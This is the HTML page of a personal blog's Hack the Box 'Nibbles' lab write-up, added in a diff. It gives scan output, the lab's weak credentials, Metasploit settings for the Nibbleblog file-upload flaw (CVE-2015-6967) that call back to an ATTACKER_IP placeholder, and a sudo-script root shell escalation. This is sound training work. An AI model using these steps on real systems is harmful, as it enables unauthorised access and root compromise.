@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Nibbles - Hack the Box | Security With Ian</title>
+<meta name="keywords" content="">
+<meta name="description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-02
+Write-up Authored by: Ian Simons
+Challenge Created by: mrb3n8132
+Core Competencies:
+
+Network Enumeration with Nmap
+Manual Web Enumeration
+Web Enumeration with Gobuster
+Vulnerability Research
+Initial Access with Metasploit
+Privilege Enumeration
+Privilege Escalation
+
+
+Overview
+This Box was completed as part of the Hack the Box Academy Job Role Path &ldquo;Penetration Tester&rdquo; in the &ldquo;Getting Started&rdquo; Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals.
+Note: Flags documented in Appendix B">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/nibbles---hack-the-box/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/nibbles---hack-the-box/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/security-toolkit/" title="Security Toolkit">
+                    <span>Security Toolkit</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Nibbles - Hack the Box
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-09-02 00:00:00 +0000 UTC'>September 2, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy</p>
+<p><strong>OS:</strong> Linux</p>
+<p><strong>Date Completed:</strong> 2026-09-02</p>
+<p><strong>Write-up Authored by:</strong> Ian Simons</p>
+<p><strong>Challenge Created by:</strong> mrb3n8132</p>
+<p><strong>Core Competencies:</strong></p>
+<ul>
+<li>Network Enumeration with <strong>Nmap</strong></li>
+<li>Manual Web Enumeration</li>
+<li>Web Enumeration with <strong>Gobuster</strong></li>
+<li>Vulnerability Research</li>
+<li>Initial Access with <strong>Metasploit</strong></li>
+<li>Privilege Enumeration</li>
+<li>Privilege Escalation</li>
+</ul>
+<hr>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This Box was completed as part of the Hack the Box Academy Job Role Path &ldquo;Penetration Tester&rdquo; in the &ldquo;Getting Started&rdquo; Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my <strong>Metasploit</strong> fundamentals.
+Note: Flags documented in Appendix B</p>
+<hr>
+<h2 id="vulnerability-summary">Vulnerability summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
+<table>
+	<thead>
+			<tr>
+					<th>Vulnerability</th>
+					<th>Vulnerability Classification</th>
+					<th>CVSS Score</th>
+					<th>MITRE ATT&amp;CK Technique</th>
+					<th>ATT&amp;CK Tactic</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Nibbleblog 4.0.3 - Arbitrary File Upload</td>
+					<td>CVE-2015-6967</td>
+					<td>6.5 (CVSS v2)</td>
+					<td>T1190 - Exploit Public-Facing Application</td>
+					<td>Initial Access</td>
+			</tr>
+			<tr>
+					<td>Weak Credentials</td>
+					<td>CWE - 521 - Weak Password Requirements</td>
+					<td>N/A</td>
+					<td>T1078 - Valid Accounts</td>
+					<td>Initial Access</td>
+			</tr>
+			<tr>
+					<td>Writable Script Executable via Sudo</td>
+					<td>CWE - 732 - Incorrect Permission Assignment for Critical Resource</td>
+					<td>N/A</td>
+					<td>T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td>
+					<td>Privilege Escalation</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="attack-path-summary">Attack Path Summary<a hidden class="anchor" aria-hidden="true" href="#attack-path-summary">#</a></h2>
+<ol>
+<li>Performed network reconnaissance with <strong>Nmap</strong> and identified <strong>OpenSSH 7.2p2</strong> running on Ubuntu as well as <strong>Apache HTTP Server 2.4.18</strong></li>
+<li>Performed web enumeration, and identified <strong>Nibbleblog v4.0.3</strong></li>
+<li>Identified the username <strong>admin</strong> in a configuration file</li>
+<li>Identified valid credentials <code>admin:nibbles</code> through contextual password analysis</li>
+<li>Leveraged the <strong>Metasploit Framework</strong> module <strong>exploit/multi/http/nibbleblog_file_upload</strong> to gain initial access to the machine</li>
+<li>Identified that the current user had <strong>NOPASSWD</strong> sudo privileges for <strong>/home/nibbler/personal/stuff/monitor.sh</strong></li>
+<li>Identified that current user has write access to <strong>/home/nibbler/personal/stuff/monitor.sh</strong></li>
+<li>Edited the script <strong>monitor.sh</strong> to spawn a root shell and ran script, successfully achieving root privileges</li>
+</ol>
+<hr>
+<h2 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h2>
+<h3 id="port-discovery">Port Discovery<a hidden class="anchor" aria-hidden="true" href="#port-discovery">#</a></h3>
+<p>Nmap scan results</p>
+<pre tabindex="0"><code>┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~]
+└──╼ [★]$ sudo nmap -sC -sV -oN scan.txt 10.129.64.28
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 14:01 EDT
+Nmap scan report for 10.129.64.28
+Host is up (0.0085s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
+</code></pre><h4 id="key-open-ports-and-services">Key Open Ports and Services<a hidden class="anchor" aria-hidden="true" href="#key-open-ports-and-services">#</a></h4>
+<table>
+	<thead>
+			<tr>
+					<th>Port</th>
+					<th>Service</th>
+					<th>Version</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>22/TCP</td>
+					<td>SSH</td>
+					<td>OpenSSH 7.2p2</td>
+			</tr>
+			<tr>
+					<td>80/TCP</td>
+					<td>HTTP</td>
+					<td>Apache httpd 2.4.18</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h3>
+<p>Web application returned a page displaying only &ldquo;Hello world!&rdquo;, but a comment in the html said, <code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code>. Upon navigating to <strong>/nibbleblog</strong> an empty blog was found, in the bottom right stating it was &ldquo;Powered by Nibbleblog&rdquo; ran a <strong>Gobuster</strong> scan against the blog and found the following results.</p>
+<pre tabindex="0"><code>┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~]
+└──╼ [★]$ gobuster dir -u http://10.129.64.28/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.64.28/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/content              (Status: 301) [Size: 325] [--&gt; http://10.129.64.28/nibbleblog/content/]
+/themes               (Status: 301) [Size: 324] [--&gt; http://10.129.64.28/nibbleblog/themes/]
+/admin                (Status: 301) [Size: 323] [--&gt; http://10.129.64.28/nibbleblog/admin/]
+/plugins              (Status: 301) [Size: 325] [--&gt; http://10.129.64.28/nibbleblog/plugins/]
+/README               (Status: 200) [Size: 4628]
+/languages            (Status: 301) [Size: 327] [--&gt; http://10.129.64.28/nibbleblog/languages/]
+Progress: 87664 / 87665 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre><p>Identified nibble blog version of 4.0.3 on <strong>/nibbleblog/README</strong> which was publicly accessible.
+Identified username <strong>admin</strong> in the file <strong>/nibbleblog/content/private/users.xml</strong> which was publicly accessible.</p>
+<h3 id="vulnerability-research">Vulnerability Research<a hidden class="anchor" aria-hidden="true" href="#vulnerability-research">#</a></h3>
+<p>Publicly Accessible page <strong>/nibbleblog/README</strong> identified Nibbleblog version 4.0.3. Research identified CVE-2015-6967 an arbitrary file upload vulnerability allowing remote code execution through the <strong>my_image</strong> plugin, and an existing <strong>Metasploit</strong> module.</p>
+<hr>
+<h2 id="initial-access">Initial Access<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h2>
+<h3 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h3>
+<ul>
+<li>Description: Nibbleblog 4.0.3 - Arbitrary File Upload, Weak Credentials</li>
+<li>Vulnerability Classification: CVE-2015-6967, CWE - 521 - Weak Password Requirements</li>
+<li>CVSS score: 6.5 (CVSS v2), N/A</li>
+<li>MITRE ATT&amp;CK: Initial Access - T1190: Exploit Public-Facing Application, Initial Access - T1078: Valid Accounts</li>
+</ul>
+<p>Nibble Blog 4.0.3 is vulnerable to an unrestricted file upload. This means that administrators can upload files with an executable extension which would then allow them to execute arbitrary code using a direct request to <strong>/content/private/plugins/my_image/image.php</strong>. There is an existing <strong>Metasploit</strong> Module for this vulnerability and as I am working to improve my <strong>Metasploit skills</strong> we will utilize this module.</p>
+<h4 id="exploitation-steps">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps">#</a></h4>
+<p>Based on the identified Nibble Blog 4.0.3 vulnerability we identified, the <strong>Metasploit</strong> module <strong>exploit/multi/http/nibbleblog_file_upload</strong> was selected because it specifically targets CVE-2015-6967. Only the username admin had been identified so far. Because the application enforced a strict login lockout policy, traditional password spraying or guessing attacks were not feasible. However, the machine name, application name, and username all revolved around the term &ldquo;nibble&rdquo;, making &ldquo;nibbles&rdquo; a reasonable contextual password candidate. Authentication was successful using this credential.</p>
+<ol>
+<li>Launch Metasploit framework</li>
+<li>Select module <strong>exploit/multi/http/nibbleblog_file_upload</strong> targeting CVE-2015-6967</li>
+<li>Configure target and callback parameters</li>
+<li>Execute the exploit and obtain a remote session</li>
+</ol>
+<h4 id="key-commands--payloads">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads">#</a></h4>
+<pre tabindex="0"><code># launch Metasploit Framework console
+msfconsole
+
+# select appropriate exploit module
+use exploit/multi/http/nibbleblog_file_upload
+
+# set appropriate options for module
+set PASSWORD nibbles
+set RHOST &lt;TARGET_IP&gt;
+set RPORT 80
+set TARGETURI /nibbleblog/
+set USERNAME admin
+set LHOST &lt;ATTACKER_IP&gt;
+set LPORT 4444
+
+# run exploit
+run
+</code></pre><h4 id="proof-of-access">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access">#</a></h4>
+<h5 id="screenshots">Screenshots<a hidden class="anchor" aria-hidden="true" href="#screenshots">#</a></h5>
+<p><img alt="InitialAccess.jpg" loading="lazy" src="/images/nibbles/InitialAccess.jpg">
+Figure 1: Proof of initial access. Successful exploitation of CVE-2015-6967 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system.</p>
+<h5 id="session-validation-commands">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands">#</a></h5>
+<pre tabindex="0"><code>#Check user context
+whoami
+
+#Verify target hostname
+hostname
+
+#Verify operating system version
+ uname -a
+</code></pre><hr>
+<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<h3 id="vulnerability-details-1">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h3>
+<ul>
+<li>Description: Writable Script Executable via Sudo</li>
+<li>Vulnerability Classification: CWE - 732 Sudo Misconfiguration</li>
+<li>CVSS score: N/A</li>
+<li>MITRE ATT&amp;CK:  Privilege Escalation - T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo caching</li>
+</ul>
+<p>Enumeration of sudo privileges revealed that the user <strong>nibbler</strong> could execute <strong>/home/nibbler/personal/stuff/monitor.sh</strong> as root without providing a password. Because the user had write permissions within the script directory, it was possible to modify the script and execute arbitrary commands as root.</p>
+<h4 id="exploitation-steps-1">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps-1">#</a></h4>
+<ol>
+<li>Check current sudo privileges</li>
+<li>Create required directories</li>
+<li>Create malicious script</li>
+<li>Change script permissions</li>
+<li>Execute script with sudo and obtain root privileges</li>
+</ol>
+<h4 id="key-commands--payloads-1">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads-1">#</a></h4>
+<pre tabindex="0"><code># check current sudo privileges
+sudo -l
+
+# create necessary directories
+mkdir -p /home/nibbler/personal/stuff
+
+# create malicious script
+echo &#34;bash -c &#39;/bin/bash&#39;&#34; &gt; /home/nibbler/personal/stuff/monitor.sh
+
+# change script permissions
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+
+# run script as root
+sudo /home/nibbler/personal/stuff/monitor.sh
+
+# verify execution context
+whoami
+</code></pre><h4 id="proof-of-privilege-escalation">Proof of Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#proof-of-privilege-escalation">#</a></h4>
+<p><img alt="privEsc.jpg" loading="lazy" src="/images/nibbles/privEsc.jpg">
+Figure 2: Proof of Privilege Escalation. Successful exploitation resulted in execution within the root security context. Privileges were validated by confirming the execution context with the <code>whoami</code> command.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<p>This box really pushed me. While I did use <strong>Gobuster</strong> for some web directory enumeration, I still did plenty of manual Web Enumeration. This really helped build my Web Enumeration skills, as well as improve my confidence as I am still quite new to offensive security. The Privilege Escalation section also pushed me. However it was really cool to see examples covered in Academy used in the wild some key takeaways include:</p>
+<ul>
+<li>Findings, no matter how small, can lead lead to significant compromoze</li>
+<li>Make zero assumptions, nibble blog at first just seemed like the name of the blog, and I absent-mindedly assumed it was for longer than I would like to admit.</li>
+<li>Slow down while performing Enumeration, don&rsquo;t rush or you may miss obvious opportunities</li>
+</ul>
+<hr>
+<h2 id="appendix">Appendix<a hidden class="anchor" aria-hidden="true" href="#appendix">#</a></h2>
+<h3 id="appendix-a">Appendix A<a hidden class="anchor" aria-hidden="true" href="#appendix-a">#</a></h3>
+<h4 id="tools-used">Tools Used<a hidden class="anchor" aria-hidden="true" href="#tools-used">#</a></h4>
+<table>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Nmap</td>
+					<td>Network Reconnaissance, Service Discovery, and version detection</td>
+			</tr>
+			<tr>
+					<td>SearchSploit</td>
+					<td>Vulnerability research and exploit identification</td>
+			</tr>
+			<tr>
+					<td>Metasploit Framework</td>
+					<td>Exploitation, session management, post-exploitation, and privilege escalation</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="appendix-b">Appendix B<a hidden class="anchor" aria-hidden="true" href="#appendix-b">#</a></h3>
+<h4 id="flags-found">Flags found<a hidden class="anchor" aria-hidden="true" href="#flags-found">#</a></h4>
+<p><img alt="userFlag" loading="lazy" src="/images/nibbles/userFlag.jpg">
+User Flag:
+700c*************************7d1</p>
+<p><img alt="rootflag" loading="lazy" src="/images/nibbles/rootFlag.jpg">
+Root Flag:
+aa4**************************6e9</p>
+<h3 id="appendix-c">Appendix C<a hidden class="anchor" aria-hidden="true" href="#appendix-c">#</a></h3>
+<h4 id="supporting-evidence">Supporting Evidence<a hidden class="anchor" aria-hidden="true" href="#supporting-evidence">#</a></h4>
+<p>No additional supporting evidence was required beyond the artifacts included throughout this write-up</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Security With Ian</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
